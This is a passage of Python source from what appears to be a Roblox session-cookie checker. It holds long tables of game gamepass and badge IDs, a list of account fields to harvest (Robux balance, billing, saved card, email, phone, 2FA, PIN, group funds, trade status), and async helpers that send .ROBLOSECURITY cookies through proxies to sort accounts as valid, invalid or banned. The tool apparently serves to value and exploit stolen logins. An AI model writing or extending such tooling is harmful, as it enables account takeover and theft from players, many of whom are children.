        WouldYouLeaveNahIdRoll  = 'Would You Leave? / Nah I\'d Roll', 846169662502095,  'Would_You_Leave_Nah_Id_Roll'
        RollEatSleepRepeat      = 'Roll, Eat, Sleep, Repeat',         1872289370492358, 'Roll_Eat_Sleep_Repeat'
        Takeabreak              = 'Take a break',                     1092603390197325, 'Take_a_break'
        Icantstopplayingthis    = 'I can\'t stop playing this',       2731678596419900, 'I_cant_stop_playing_this'
        Wasteoftime             = 'Waste of time',                    4356557421515611, 'Waste_of_time'
        Touchthegrass           = 'Touch the grass',                  3336758570255487, 'Touch_the_grass'
        SpottedtheSol           = 'Spotted the Sol',                  2201290015607347, 'Spotted_the_Sol'
        Indev                   = 'In-dev',                           1253153057071204, 'In_dev'
        Finishedworkfortoday    = 'Finished work for today',          257464335458276,  'Finished_work_for_today'
        Goodjobthisweektoo      = 'Good job this week too',           1918952643310114, 'Good_job_this_week_too'
        Asincereperson          = 'A sincere person',                 3145321935208607, 'A_sincere_person'
        Whenispayday            = 'When is payday???',                1496986902550849, 'When_is_payday'
        StarEgg                 = 'Star Egg',                         2270659814141729, 'Star_Egg'
        LockEgg                 = 'Lock Egg',                         559749433012559,  'Lock_Egg'
        Theresnowaytostopit     = 'There\'s no way to stop it!',      202360729284337,  'Theres_no_way_to_stop_it'
        Igivemylife             = 'I give my life...',                744944723444729,  'I_give_my_life'
        Eternaltime             = 'Eternal time...',                  4072147147623458, 'Eternal_time'
        Myeternaljourney        = 'My eternal journey',               1605629548712504, 'My_eternal_journey'
        Breakthrough            = 'Breakthrough',                     2925176588215112, 'Breakthrough'
        Breakthelimit           = 'Break the limit',                  1356271377596280, 'Break_the_limit'
        BreaktheSpace           = 'Break the Space',                  1858966971108205, 'Break_the_Space'
        BreaktheGalaxy          = 'Break the Galaxy',                 1849903315759188, 'Break_the_Galaxy'
        BreaktheReality         = 'Break the Reality',                3593181263483436, 'Break_the_Reality'
        PerfectAttendanceAward  = 'Perfect Attendance Award',         3718807305779124, 'Perfect_Attendance_Award'
        FlawsintheWorld         = '-Flaws in the World-',             2457971054390553, 'Flaws_in_the_World'
        OnewhostandsbeforeGod   = '-One who stands before God-',      3236492292509665, 'One_who_stands_before_God'
        TheUnknown              = '-The Unknown-',                    1503563480176545, 'The_Unknown'
        AchievementSlayer       = 'Achievement Slayer',               476770132708833,  'Achievement_Slayer'
        AchievementMaster       = 'Achievement Master',               1201821091232234, 'Achievement_Master'
        AchievementChampion     = 'Achievement Champion',             348376112222987,  'Achievement_Champion'
        TheStigma               = 'The Stigma',                       1896511924362574, 'The_Stigma'
        DAY100                  = '#DAY100',                          399984649890845,  'DAY100'
        Missioncomplete         = 'Mission complete!',                1105302727042025, 'Mission_complete'
        Excellentservice        = 'Excellent service',                4319723733895149, 'Excellent_service'
        Professionalhelper      = 'Professional helper',              2192515070354146, 'Professional_helper'
        Questmaster             = 'Quest master',                     3021901927162320, 'Quest_master'
        Questslayer             = 'Quest slayer',                     723035340044103,  'Quest_slayer'
        SecretTrade             = 'Secret Trade',                     2620948537626731, 'Secret_Trade'
        Biomeitself             = 'Biome itself',                     4224933102884595, 'Biome_itself'
        Famous                  = 'Famous!',                          4096899752944070, 'Famous'
        Grandmaster             = 'Grandmaster',                      2091741945674306, 'Grandmaster'
        Amemorytobeforgotten    = 'A memory to be forgotten',         3625566987462442, 'A_memory_to_be_forgotten'
        TheLost                 = 'The Lost',                         2460941940564506, 'The_Lost'
        TheLimbo                = 'The Limbo',                        179330822551495,  'The_Limbo'
        TheZero                 = 'The Zero',                         4370606648952666, 'The_Zero'
        PreSandWormSlayer       = 'Pre-Sand Worm Slayer',             978766174460625,  'Pre_Sand_Worm_Slayer'
        CrawlerSlayer           = 'Crawler Slayer',                   645141997675497,  'Crawler_Slayer'
        Millions10              = '10,000,000',                       137829805535621,  '10000000'
        Millions15              = '15,000,000',                       485557368787476,  '15000000'
        Millions20              = '20,000,000',                       1801598389006571, '20000000'
        Millions30              = '30,000,000',                       2295935762202367, '30000000'
        Millions50              = '50,000,000',                       2994269484017383, '50000000'
        Myfirst10MPlusfinding   = 'My first 10M+ finding',            1121298629065726, 'My_first_10M_Plus_finding'
        Myfirst100MPlusfinding  = 'My first 100M+ finding',           3516455555443766, 'My_first_100M_Plus_finding'
        Myfirst1BPlusfinding    = 'My first 1B+ finding',             1224551724339726, 'My_first_1B_Plus_finding'
        Dimensional             = 'Dimensional',                      26095976848236,   'Dimensional'
        Unnamed1                = '??? 1',                            734804938884338,  'Unnamed_1'
        Unnamed2                = '??? 2',                            807013057656632,  'Unnamed_2'
        Unnamed3                = '??? 3',                            1324193838431233, 'Unnamed_3'
        Unnamed4                = '??? 4',                            1352157690781028, 'Unnamed_4'
        Unnamed5                = '??? 5',                            1956542596523913, 'Unnamed_5'
        Unnamed6                = '??? 6',                            3137343012568311, 'Unnamed_6'
        Unnamed7                = '??? 7',                            3618488813178695, 'Unnamed_7'
        Unnamed8                = '??? 8',                            4100206722227429, 'Unnamed_8'
        # List Of Badges
        listOfBadges = [IjuststartedSolsRNG, Alittlebitofrolls, ImaddictedtoSolsRNG, WouldYouLeaveNahIdRoll, RollEatSleepRepeat, Takeabreak, Icantstopplayingthis, Wasteoftime, Touchthegrass, SpottedtheSol, Indev, Finishedworkfortoday, Goodjobthisweektoo, Asincereperson, Whenispayday, StarEgg, LockEgg, Theresnowaytostopit, Igivemylife, Eternaltime, Myeternaljourney, Breakthrough, Breakthelimit, BreaktheSpace, BreaktheGalaxy, BreaktheReality, PerfectAttendanceAward, FlawsintheWorld, OnewhostandsbeforeGod, TheUnknown, AchievementSlayer, AchievementMaster, AchievementChampion, TheStigma, DAY100, Missioncomplete, Excellentservice, Professionalhelper, Questmaster, Questslayer, SecretTrade, Biomeitself, Famous, Grandmaster, Amemorytobeforgotten, TheLost, TheLimbo, TheZero, PreSandWormSlayer, CrawlerSlayer, Millions10, Millions15, Millions20, Millions30, Millions50, Myfirst10MPlusfinding, Myfirst100MPlusfinding, Myfirst1BPlusfinding, Dimensional, Unnamed1, Unnamed2, Unnamed3, Unnamed4, Unnamed5, Unnamed6, Unnamed7, Unnamed8]

class StealaBrainrot: # https://www.roblox.com/games/109983668079237
    placeNames = 'Steal a Brainrot', 'Steal_a_Brainrot', 'SaB', 109983668079237
    class Gamepasses:
        AdminCommands = 'Admin Commands', 1227013099, 'Admin_Commands'
        VIP           = 'VIP',            1229510262, 'VIP'
        x2Money       = '2x Money',       1228591447, '2x_Money'
        # List Of Gamepasses
        listOfGamepasses = [AdminCommands, VIP, x2Money]

class ToiletTowerDefense: # https://www.roblox.com/games/13775256536
    placeNames = 'Toilet Tower Defense', 'Toilet_Tower_Defense', 'TTD', 13775256536
    class Gamepasses:
        VIP                       = 'VIP',                           257410325,  'VIP'
        Lucky                     = 'Lucky',                         208619622,  'Lucky'
        DoubleCoins               = 'Double Coins',                  208620375,  'Double_Coins'
        Plus1000InventoryStorage  = '+1000 Inventory Storage',       646799606,  'Plus_1000_Inventory_Storage'
        InfiniteUnits             = 'Infinite Units',                767749542,  'Infinite_Units'
        ClanCreator               = 'Clan Creator',                  897195671,  'Clan_Creator'
        x2Drills                  = '2x Drills',                     930624309,  '2x_Drills'
        ShinyHunter               = 'Shiny Hunter',                  952446306,  'Shiny_Hunter'
        TraitHunter               = 'Trait Hunter',                  1198051550, 'Trait_Hunter'
        SummerPassPremiumTrack    = 'Summer Pass: Premium Track',    1272594550, 'Summer_Pass_Premium_Track'
        DoubleLuckyToiletSpawning = 'Double Lucky Toilet Spawning!', 1105184340, 'Double_Lucky_Toilet_Spawning'
        # List Of Gamepasses
        listOfGamepasses = [VIP, Lucky, DoubleCoins, Plus1000InventoryStorage, InfiniteUnits, ClanCreator, x2Drills, ShinyHunter, TraitHunter, SummerPassPremiumTrack, DoubleLuckyToiletSpawning]
    class Badges:
        BeatEasyDifficulty           = 'Beat Easy Difficulty!',           2148808870,       'Beat_Easy_Difficulty'
        BeatMediumDifficulty         = 'Beat Medium Difficulty!',         2148808877,       'Beat_Medium_Difficulty'
        BeatHardDifficulty           = 'Beat Hard Difficulty!',           2148967266,       'Beat_Hard_Difficulty'
        BeatNightmareDifficulty      = 'Beat Nightmare Difficulty!',      2149510852,       'Beat_Nightmare_Difficulty'
        BeatAbysmalDifficulty        = 'Beat Abysmal Difficulty!',        205916089448424,  'Beat_Abysmal_Difficulty'
        BeatSecretEvilWave           = 'Beat Secret Evil Wave',           3269012098035529, 'Beat_Secret_Evil_Wave'
        TitanSpeakerman              = 'Titan Speakerman',                2148698556,       'Titan_Speakerman'
        TitanTVMan                   = 'Titan TV Man',                    2148967295,       'Titan_TV_Man'
        NinjaCameraman               = 'Ninja Cameraman',                 2149260235,       'Ninja_Cameraman'
        MechCameraman                = 'Mech Cameraman',                  2149529631,       'Mech_Cameraman'
        LaserCameramanCar            = 'Laser Cameraman Car',             2149898179,       'Laser_Cameraman_Car'
        SecretAgent                  = 'Secret Agent',                    2150077001,       'Secret_Agent'
        UpgradedTitanCameraman       = 'Upgraded Titan Cameraman',        2150356615,       'Upgraded_Titan_Cameraman'
        TitanCinemaman               = 'Titan Cinemaman',                 2150356638,       'Titan_Cinemaman'
        DarkSpeakerman               = 'Dark Speakerman',                 2150593479,       'Dark_Speakerman'
        UpgradedTitanSpeakerman      = 'Upgraded Titan Speakerman',       2150879473,       'Upgraded_Titan_Speakerman'
        DancingSpeakerwoman          = 'Dancing Speakerwoman',            2151779704,       'Dancing_Speakerwoman'
        GlitchCameraman              = 'Glitch Cameraman',                2153379585,       'Glitch_Cameraman'
        JetpackSpeakerman            = 'Jetpack Speakerman',              2153379588,       'Jetpack_Speakerman'
        UpgradedTitanCinemaman       = 'Upgraded Titan Cinemaman',        2502574037187648, 'Upgraded_Titan_Cinemaman'
        DualBatSpeakerman            = 'Dual Bat Speakerman',             4443545723157147, 'Dual_Bat_Speakerman'
        LargeLaserCameraman          = 'Large Laser Cameraman',           3045860093689297, 'Large_Laser_Cameraman'
        ShotgunCameraman             = 'Shotgun Cameraman',               2385641468984928, 'Shotgun_Cameraman'
        MinigunCamerawoman           = 'Minigun Camerawoman',             1233182747919466, 'Minigun_Camerawoman'
        KatanaSpeakerwoman           = 'Katana Speakerwoman',             2817031393332978, 'Katana_Speakerwoman'
        SpearSpeakerman              = 'Spear Speakerman',                1150879405352932, 'Spear_Speakerman'
        RedLaserCameraman            = 'Red Laser Cameraman',             931050305844465,  'Red_Laser_Cameraman'
        UpgradedMechCameraman        = 'Upgraded Mech Cameraman',         1115010233662541, 'Upgraded_Mech_Cameraman'
        MaceCamerawoman              = 'Mace Camerawoman',                1127660680344125, 'Mace_Camerawoman'
        ClockEvent                   = 'Clock Event',                     1630314579932289, 'Clock_Event'
        KnifeUpgradedTitanSpeakerman = 'Knife Upgraded Titan Speakerman', 4014008284565926, 'Knife_Upgraded_Titan_Speakerman'
        AstroGunCameraman            = 'Astro Gun Cameraman',             3721219248389823, 'Astro_Gun_Cameraman'
        SummerEvent2024              = 'Summer Event 2024',               2473445528937503, 'Summer_Event_2024'
        FinishedBeachBallHunt2024    = 'Finished Beach Ball Hunt 2024',   2247321279730360, 'Finished_Beach_Ball_Hunt_2024'
        BuffMutantToilet             = 'Buff Mutant Toilet',              1712380323524027, 'Buff_Mutant_Toilet'
        BeatDrillForest              = 'Beat Drill Forest',               1983663233025849, 'Beat_Drill_Forest'
        BeatDrillWorld               = 'Beat Drill World',                3719490798478354, 'Beat_Drill_World'
        BeatHalloweenGraveyard2024   = 'Beat Halloween Graveyard 2024',   2977453670049037, 'Beat_Halloween_Graveyard_2024'
        BeatThanksgivingTable        = 'Beat Thanksgiving Table',         1799362452924436, 'Beat_Thanksgiving_Table'
        BeatDiceWorld                = 'Beat Dice World',                 315021521983622,  'Beat_Dice_World'
        TheHatch                     = 'The Hatch!',                      1001707030871277, 'The_Hatch'
        # List Of Badges
        listOfBadges = [BeatEasyDifficulty, BeatMediumDifficulty, BeatHardDifficulty, BeatNightmareDifficulty, BeatAbysmalDifficulty, BeatSecretEvilWave, TitanSpeakerman, TitanTVMan, NinjaCameraman, MechCameraman, LaserCameramanCar, SecretAgent, UpgradedTitanCameraman, TitanCinemaman, DarkSpeakerman, UpgradedTitanSpeakerman, DancingSpeakerwoman, GlitchCameraman, JetpackSpeakerman, UpgradedTitanCinemaman, DualBatSpeakerman, LargeLaserCameraman, ShotgunCameraman, MinigunCamerawoman, KatanaSpeakerwoman, SpearSpeakerman, RedLaserCameraman, UpgradedMechCameraman, MaceCamerawoman, ClockEvent, KnifeUpgradedTitanSpeakerman, AstroGunCameraman, SummerEvent2024, FinishedBeachBallHunt2024, BuffMutantToilet, BeatDrillForest, BeatDrillWorld, BeatHalloweenGraveyard2024, BeatThanksgivingTable, BeatDiceWorld, TheHatch]

class TowerDefenseSimulator: # https://www.roblox.com/games/3260590327
    placeNames = 'Tower Defense Simulator', 'Tower_Defense_Simulator', 'TDS', 3260590327
    class Gamepasses:
        Test                  = 'Test',                    6808274,    'Test'
        SmallDonation         = 'Small Donation',          6680173,    'Small_Donation'
        CrookBoss             = 'Crook Boss',              6757455,    'Crook_Boss'
        Turret                = 'Turret',                  6935538,    'Turret'
        CustomMusic           = 'Custom Music',            7104817,    'Custom_Music'
        Mortar                = 'Mortar',                  7838041,    'Mortar'
        Pursuit               = 'Pursuit',                 9735384,    'Pursuit'
        VIP                   = 'VIP',                     10518590,   'VIP'
        Hacker                = 'Hacker',                  1252103819, 'Hacker'
        MemeEmotes            = 'Meme Emotes',             11467931,   'Meme_Emotes'
        Sledger               = 'Sledger',                 13534631,   'Sledger'
        Executioner           = 'Executioner',             25711202,   'Executioner'
        Engineer              = 'Engineer',                40385775,   'Engineer'
        ResizeYourPlayer      = 'Resize Your Player!',     65949871,   'Resize_Your_Player'
        Cowboy                = 'Cowboy',                  90119024,   'Cowboy'
        Warden                = 'Warden',                  99570026,   'Warden'
        VigilanteSkinBundle   = 'Vigilante Skin Bundle',   193944933,  'Vigilante_Skin_Bundle'
        UnwaveringTidesBundle = 'Unwavering Tides Bundle', 224102025,  'Unwavering_Tides_Bundle'
        MercenaryBase         = 'Mercenary Base',          786591818,  'Mercenary_Base'
        GatlingGun            = 'Gatling Gun!',            924927232,  'Gatling_Gun'
        AdminMode             = 'Admin Mode',              1002808617, 'Admin_Mode'
        Slasher               = 'Slasher',                 7386135,    'Slasher'
        Gladiator             = 'Gladiator',               7656528,    'Gladiator'
        FrostBlasterTower     = 'Frost Blaster Tower',     7846530,    'Frost_Blaster_Tower'
        GiftOfJoy             = 'Gift Of Joy',             7846620,    'Gift_Of_Joy'
        GiftofMystery         = 'Gift of Mystery',         7846621,    'Gift_of_Mystery'
        GiftofSharp           = 'Gift of Sharp',           7846623,    'Gift_of_Sharp'
        FireworksEmote        = 'Fireworks Emote',         7913109,    'Fireworks_Emote'
        PartySkins            = 'Party Skins',             7913591,    'Party_Skins'
        AllEasterSkins        = 'All Easter Skins',        8868550,    'All_Easter_Skins'
        Swarmer               = 'Swarmer',                 8868555,    'Swarmer'
        ArcherTower           = 'Archer Tower',            8928263,    'Archer_Tower'
        ToxicGunner           = 'Toxic Gunner',            13534630,   'Toxic_Gunner'
        ElfCamp               = 'Elf Camp!',               112619685,  'Elf_Camp'
        Necromancer           = 'Necromancer',             643819691,  'Necromancer'
        JesterTower           = 'Jester Tower!',           652291181,  'Jester_Tower'
        CryomancerTower       = 'Cryomancer Tower',        674876666,  'Cryomancer_Tower'
        Harvester             = 'Harvester',               953808062,  'Harvester'
        HallowPunk            = 'Hallow Punk',             954430263,  'Hallow_Punk'
        Commando              = 'Commando',                977109244,  'Commando'
        Elementalist          = 'Elementalist',            1007556869, 'Elementalist'
        Snowballer            = 'Snowballer',              1007420790, 'Snowballer'
        Ignorethisgamepass    = 'Ignore this gamepass',    12511535,   'Ignore_this_gamepass'
        Biologist             = 'Biologist',               1160816963, 'Biologist'
        HelloWorld            = 'Hello World!',            1252451656, 'Hello_World'
        # List Of Gamepasses
        listOfGamepasses = [Test, SmallDonation, CrookBoss, Turret, CustomMusic, Mortar, Pursuit, VIP, Hacker, MemeEmotes, Sledger, Executioner, Engineer, ResizeYourPlayer, Cowboy, Warden, VigilanteSkinBundle, UnwaveringTidesBundle, MercenaryBase, GatlingGun, AdminMode, Slasher, Gladiator, FrostBlasterTower, GiftOfJoy, GiftofMystery, GiftofSharp, FireworksEmote, PartySkins, AllEasterSkins, Swarmer, ArcherTower, ToxicGunner, ElfCamp, Necromancer, JesterTower, CryomancerTower, Harvester, HallowPunk, Commando, Elementalist, Snowballer, Ignorethisgamepass, Biologist, HelloWorld]
    class Badges:
        WelcometoTDS           = 'Welcome to TDS!',           2124615656,       'Welcome_to_TDS'
        Level10                = 'Level 10',                  2124477834,       'Level_10'
        Level20                = 'Level 20',                  2124477835,       'Level_20'
        Level30                = 'Level 30',                  2124475816,       'Level_30'
        Level50                = 'Level 50',                  2124477836,       'Level_50'
        Level75                = 'Level 75',                  2124477837,       'Level_75'
        Level100               = 'Level 100',                 2124477838,       'Level_100'
        Level150               = 'Level 150',                 265315644206668,  'Level_150'
        DefeatedtheBrute       = 'Defeated the Brute',        4101345145774971, 'Defeated_the_Brute'
        DefeatGraveDigger      = 'Defeat Grave Digger',       2124572793,       'Defeat_Grave_Digger'
        DefeatMoltenWarlord    = 'Defeat Molten Warlord',     2124572794,       'Defeat_Molten_Warlord'
        DefeattheFallenKing    = 'Defeat the Fallen King',    2124615655,       'Defeat_the_Fallen_King'
        DefeatedNuclearMonster = 'Defeated Nuclear Monster!', 2127670181,       'Defeated_Nuclear_Monster'
        DefeatedGunslinger     = 'Defeated Gunslinger!',      2128794382,       'Defeated_Gunslinger'
        DefeatedWoxTheFox      = 'Defeated Wox The Fox!',     2129234537,       'Defeated_Wox_The_Fox'
        DefeatedPatientZero    = 'Defeated Patient Zero!',    2433001319089453, 'Defeated_Patient_Zero'
        TriumphHardcore        = 'Triumph Hardcore',          2124629158,       'Triumph_Hardcore'
        Quickdraw              = 'Quickdraw!',                2128794398,       'Quickdraw'
        TheLostSouls           = 'The Lost Souls',            2129234540,       'The_Lost_Souls'
        FrostInvasionEasy      = 'Frost Invasion - Easy',     1566890568849948, 'Frost_Invasion_Easy'
        FrostInvasionHard      = 'Frost Invasion - Hard',     842976148689508,  'Frost_Invasion_Hard'
        NightI                 = 'Night I',                   103759295562992,  'Night_I'
        NightIEasy             = 'Night I Easy',              1029294163081388, 'Night_I_Easy'
        NightII                = 'Night II',                  3061903590409955, 'Night_II'
        NightIIEasy            = 'Night II Easy',             1785439979300169, 'Night_II_Easy'
        NightIII               = 'Night III',                 1632959225008577, 'Night_III'
        NightIIIEasy           = 'Night III Easy',            1522290797999169, 'Night_III_Easy'
        Unnamed                = '???',                       1270412135564244, 'Unnamed'
        # List Of Badges
        listOfBadges = [WelcometoTDS, Level10, Level20, Level30, Level50, Level75, Level100, Level150, DefeatedtheBrute, DefeatGraveDigger, DefeatMoltenWarlord, DefeattheFallenKing, DefeatedNuclearMonster, DefeatedGunslinger, DefeatedWoxTheFox, DefeatedPatientZero, TriumphHardcore, Quickdraw, TheLostSouls, FrostInvasionEasy, FrostInvasionHard, NightI, NightIEasy, NightII, NightIIEasy, NightIII, NightIIIEasy, Unnamed]

class YourBizarreAdventure: # https://www.roblox.com/games/2809202155
    placeNames = 'Your Bizarre Adventure', 'Your_Bizarre_Adventure', 'YBA', 2809202155
    class Gamepasses:
        ItemNotifier      = 'Item Notifier',          7355317,  'Item_Notifier'
        SelectPose        = 'Select Pose',            7361207,  'Select_Pose'
        CosmeticsBundle1  = 'Cosmetics Bundle #1',    7368580,  'Cosmetics_Bundle_1'
        VoiceLines        = 'Voice Lines',            7376923,  'Voice_Lines'
        Tips              = 'Tips',                   8062778,  'Tips'
        StandStorageSlot1 = 'Stand Storage: Slot #1', 9837261,  'Stand_Storage_Slot_1'
        StandStorageSlot2 = 'Stand Storage: Slot #2', 9838197,  'Stand_Storage_Slot_2'
        StandStorageSlot3 = 'Stand Storage: Slot #3', 9838201,  'Stand_Storage_Slot_3'
        StandStorageSlot4 = 'Stand Storage: Slot #4', 16423469, 'Stand_Storage_Slot_4'
        StandStorageSlot5 = 'Stand Storage: Slot #5', 16423475, 'Stand_Storage_Slot_5'
        StyleStorageSlot2 = 'Style Storage: Slot #2', 13258801, 'Style_Storage_Slot_2'
        StyleStorageSlot3 = 'Style Storage: Slot #3', 13258808, 'Style_Storage_Slot_3'
        x2CosmeticSlots   = '2x Cosmetic Slots',      14597766, '2x_Cosmetic_Slots'
        x2Inventory       = '2x Inventory',           14597778, '2x_Inventory'
        # List Of Gamepasses
        listOfGamepasses = [ItemNotifier, SelectPose, CosmeticsBundle1, VoiceLines, Tips, StandStorageSlot1, StandStorageSlot2, StandStorageSlot3, StandStorageSlot4, StandStorageSlot5, StyleStorageSlot2, StyleStorageSlot3, x2CosmeticSlots, x2Inventory]
    class Badges:
        Prestige1 = 'Prestige 1', 2124517293, 'Prestige_1'
        Prestige2 = 'Prestige 2', 2124517294, 'Prestige_2'
        Prestige3 = 'Prestige 3', 2124517296, 'Prestige_3'
        # List Of Badges
        listOfBadges = [Prestige1, Prestige2, Prestige3]

listOfPlaces = [NinetyNineNightsintheForest, AUniversalTime, AdoptMe, AnimeAdventures, AnimeDefenders, AnimeVanguards, BedWars, BeeSwarmSimulator, BladeBall, BloxFruits, BlueLockRivals, BubbleGumSimulatorINFINITY, CreaturesofSonaria, DaHood, DragonAdventures, Fisch, FiveNightsTD, GrandPieceOnline, GrowaGarden, Jailbreak, JujutsuInfinite, KingLegacy, MurderMystery2, PetSimulator99, PETSGO, ProjectSlayers, Rivals, RoyalHigh, SolsRNG, StealaBrainrot, ToiletTowerDefense, TowerDefenseSimulator, YourBizarreAdventure]

class cookieData: #          Normal Name                    Config Name                  Sort
    link                   = 'Link',                        'Link',                      None
    id                     = 'ID',                          'ID',                        str
    name                   = 'Name',                        'Name',                      str
    displayName            = 'Display Name',                'Display_Name',              str
    registrationDateDMY    = 'Registration Date (D.M.Y)',   'Registration_Date_DMY',     str
    registrationDateInDays = 'Registration Date (In Days)', 'Registration_Date_In_Days', int
    countryRegistration    = 'Country Registration',        'Country_Registration',      str
    robux                  = 'Robux',                       'Robux',                     int
    billing                = 'Billing',                     'Billing',                   int
    pending                = 'Pending',                     'Pending',                   int
    donate1Year            = 'Donate (1 Year)',             'Donate_1_Year',             int
    donateAllTime          = 'Donate (All Time)',           'Donate_All_Time',           int
    rap                    = 'Rap',                         'Rap',                       int
    card                   = 'Card',                        'Card',                      int
    premium                = 'Premium',                     'Premium',                   str
    gamepasses             = 'Gamepasses',                  'Gamepasses',                int
    customGamepasses       = 'Custom Gamepasses',           'Custom_Gamepasses',         int
    badges                 = 'Badges',                      'Badges',                    int
    favoritePlaces         = 'Favorite Places',             'Favorite_Places',           int
    placesWeeklyPlaytime   = 'Places Weekly Playtime',      'Places_Weekly_Playtime',    int
    bundles                = 'Bundles',                     'Bundles',                   int
    inventoryPrivacy       = 'Inventory Privacy',           'Inventory_Privacy',         str
    tradePrivacy           = 'Trade Privacy',               'Trade_Privacy',             str
    canTrade               = 'Can Trade',                   'Can_Trade',                 str
    sessions               = 'Sessions',                    'Sessions',                  int
    email                  = 'Email',                       'Email',                     str
    phone                  = 'Phone',                       'Phone',                     str
    twoFA                  = '2FA',                         '2FA',                       str
    pin                    = 'Pin',                         'Pin',                       str
    groupsOwned            = 'Groups Owned',                'Groups_Owned',              int
    groupsMembers          = 'Groups Members',              'Groups_Members',            int
    groupsPending          = 'Groups Pending',              'Groups_Pending',            int
    groupsFunds            = 'Groups Funds',                'Groups_Funds',              int
    placeVisits            = 'Place Visits',                'Place_Visits',              int
    ageGroup               = 'Age Group',                   'Age_Group',                 str
    verifiedAge            = 'Verified Age',                'Verified_Age',              str
    verifiedVoice          = 'Verified Voice',              'Verified_Voice',            str
    friends                = 'Friends',                     'Friends',                   int
    followers              = 'Followers',                   'Followers',                 int
    followings             = 'Followings',                  'Followings',                int
    robloxBadges           = 'Roblox Badges',               'Roblox_Badges',             int
    xcsrfToken             = 'X-CSRF-Token',                'X_CSRF_Token',              None
    cookieInConsole        = 'Cookie (In Console)',         'Cookie_In_Console',         None
    # List Of Cookie Data
    listOfCookieData = [link, countryRegistration, id, name, displayName, registrationDateDMY, registrationDateInDays, robux, billing, pending, donate1Year, donateAllTime, rap, card, premium, gamepasses, customGamepasses, badges, favoritePlaces, placesWeeklyPlaytime, bundles, inventoryPrivacy, tradePrivacy, canTrade, sessions, email, phone, twoFA, pin, groupsOwned, groupsMembers, groupsPending, groupsFunds, placeVisits, ageGroup, verifiedAge, verifiedVoice, friends, followers, followings, robloxBadges, xcsrfToken, cookieInConsole]

# Отправка и обработка запросов к роблокс

async def sendGetRequestRoblox(
    url: str,
    *,
    params: Optional[dict] = None,
    headers: Optional[dict] = None,
    cookies: Optional[dict] = None,
    proxies: Optional[list[str]] = None,
    allow_redirects: bool = False,
    timeout: int = 5
) -> Optional[dict]:
    internalServerErrorTry = 0
    while True:
        try:
            async with ClientSession(connector=getConnectorRoblox(proxies), cookies=cookies, headers=headers, timeout=ClientTimeout(timeout)) as session:
                response: ClientResponse = await session.get(url, params=params, allow_redirects=allow_redirects, ssl=False)
                match response.status:
                    case 200:
                        return await response.json()
                    case 302 if response.headers.get('Location') == '/not-approved':
                        raise AccountBanned
                    case 302 | 401:
                        raise InvalidCookie
                    case 403:
                        raise AccountBanned
                    case 500:
                        internalServerErrorTry += 1
                        logger.debug(f'< [GET_REQUEST_ROBLOX] > | {cookies['.ROBLOSECURITY'][115:130] if cookies else 'No cookie'} | [500 | {MT_Try}: {internalServerErrorTry}] {url}')
                        if internalServerErrorTry >= 3:
                            return 'ERROR'
                    case _:
                        logger.debug(f'< [GET_REQUEST_ROBLOX] > | {cookies['.ROBLOSECURITY'][115:130] if cookies else 'No cookie'} | [{response.status}] {url}')

                await asyncio.sleep(5)
        except (InvalidCookie, AccountBanned):
            raise
        except Exception as e:
            force, label = [False, MT_Error] if type(e) in ETHERNET_ERRORS else [True, MT_Critical_Error]
            logger.exception(f'< [GET_REQUEST_ROBLOX] > | {cookies['.ROBLOSECURITY'][115:130] if cookies else 'No cookie'} | {label}: {e}', force=force)
            await asyncio.sleep(5)

async def sendPostRequestRoblox(
    url: str,
    *,
    params: Optional[dict] = None,
    data: Optional[dict] = None,
    json: Optional[dict] = None,
    headers: Optional[dict] = None,
    cookies: Optional[dict] = None,
    proxies: Optional[list[str]] = None,
    timeout: int = 5
) -> ClientResponse:
    while True:
        try:
            async with ClientSession(connector=getConnectorRoblox(proxies), cookies=cookies, headers=headers, timeout=ClientTimeout(timeout)) as session:
                response: ClientResponse = await session.post(url, params=params, data=data, json=json, ssl=False)
                match response.status:
                    case 200 | 403:
                        return response
                    case 401:
                        raise InvalidCookie
                    case _:
                        logger.debug(f'< [POST_REQUEST_ROBLOX] > | {cookies['.ROBLOSECURITY'][115:130] if cookies else 'No cookie'} | [{response.status}] {url}')

                await asyncio.sleep(5)
        except InvalidCookie:
            raise
        except Exception as e:
            force, label = [False, MT_Error] if type(e) in ETHERNET_ERRORS else [True, MT_Critical_Error]
            logger.exception(f'< [POST_REQUEST_ROBLOX] > | {cookies['.ROBLOSECURITY'][115:130] if cookies else 'No cookie'} | {label}: {e}', force=force)
            await asyncio.sleep(5)

### Создание глобальных чек-листов для поиска

def createGlobalCheckListGamepassesRCC() -> None: # -> dict[str, list[str]]
    if not config['Roblox']['CookieChecker']['Main']['Gamepasses']:
        return
    global checkListGamepasses
    checkListGamepasses = {}
    for place in listOfPlaces:
        if config['Roblox']['CookieChecker']['Places'][place.placeNames[1]] and hasattr(place, 'Gamepasses') and [gamepass[1] for gamepass in place.Gamepasses.listOfGamepasses if config['Roblox']['CookieChecker'][place.__name__][gamepass[2]]]:
            for gamepass in place.Gamepasses.listOfGamepasses:
                if config['Roblox']['CookieChecker'][place.__name__][gamepass[2]]:
                    checkListGamepasses[str(gamepass[1])] = {'PlaceName': rmPatternFromString(SPECIAL_CHARS, place.placeNames[0]), 'GamepassName': rmPatternFromString(SPECIAL_CHARS, gamepass[0])}
    for customPlace in config['Roblox']['CookieChecker']['CustomPlaces']['List_Of_Custom_Places']:
        customPlaceData = config['Roblox']['CookieChecker']['CustomPlaces'][rmPatternFromString(SPECIAL_CHARS, str(customPlace))]
        if customPlaceData[2] and f'{customPlace}_Gamepasses' in config['Roblox']['CookieChecker']['CustomPlaces'] and [gamepass[1] for gamepass in config['Roblox']['CookieChecker']['CustomPlaces'][f'{customPlace}_Gamepasses'] if gamepass[2]]:
            for gamepass in config['Roblox']['CookieChecker']['CustomPlaces'][f'{customPlace}_Gamepasses']:
                if gamepass[2]:
                    checkListGamepasses[str(gamepass[0])] = {'PlaceName': rmPatternFromString(SPECIAL_CHARS, customPlaceData[1][0]), 'GamepassName': rmPatternFromString(SPECIAL_CHARS, gamepass[1])}
    logger.debug(f'< [checkListGamepasses] > Generated: {checkListGamepasses}')

def createGlobalCheckListBadgesRCC() -> None: # -> dict[str, list[str]]
    if not config['Roblox']['CookieChecker']['Main']['Badges']:
        return
    global checkListBadges
    checkListBadges = {}
    for place in listOfPlaces:
        if config['Roblox']['CookieChecker']['Places'][place.placeNames[1]] and hasattr(place, 'Badges') and [badge[1] for badge in place.Badges.listOfBadges if config['Roblox']['CookieChecker'][place.__name__][badge[2]]]:
            for badge in place.Badges.listOfBadges:
                if config['Roblox']['CookieChecker'][place.__name__][badge[2]]:
